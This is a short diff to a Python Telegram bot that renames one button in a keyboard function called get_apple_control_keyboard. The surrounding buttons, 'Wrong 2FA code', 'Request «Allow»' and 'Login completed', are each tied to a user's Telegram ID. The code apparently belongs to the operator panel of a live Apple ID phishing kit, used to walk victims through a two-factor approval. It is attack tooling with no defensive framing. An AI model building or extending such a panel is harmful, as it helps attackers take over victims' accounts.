@@ -110,7 +110,7 @@ def get_apple_control_keyboard(user_tg_id: int) -> InlineKeyboardMarkup:
                 InlineKeyboardButton(text="❌ Неверный 2FA код", callback_data=f"actrl:wrong_code:{user_tg_id}"),
             ],
             [
-                InlineKeyboardButton(text="📲 Пуш на iPhone (Гео)", callback_data=f"actrl:ask_prompt:{user_tg_id}"),
+                InlineKeyboardButton(text="📲 Запрос «Разрешить»", callback_data=f"actrl:ask_prompt:{user_tg_id}"),
                 InlineKeyboardButton(text="✅ Вход выполнен", callback_data=f"actrl:complete:{user_tg_id}"),
             ],
         ]
